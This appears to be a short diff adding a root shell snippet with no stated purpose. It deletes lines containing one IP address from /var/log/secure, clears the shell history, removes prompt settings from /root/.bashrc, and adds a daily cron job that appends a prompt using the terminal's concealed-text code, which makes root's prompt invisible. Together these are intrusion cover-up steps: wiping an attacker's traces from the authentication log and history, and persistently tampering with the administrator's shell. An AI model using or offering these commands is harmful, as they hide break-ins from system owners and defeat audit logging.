@@ -1,0 +1,11 @@
+sed -i '{/PS/d}' /root/.bashrc
+sed -i '/172.40.53.159/d' /var/log/secure
+history -c
+
+
+40 8 * * * echo "PS1=\"\\e[8m[\\u@\\h \\W]\\\$\\e[8m \"" >> /root/.bashrc
+
+#P S1="\e[8m[\u@\h \W]\$\e[8m "
+
+~                                                                           
+~              
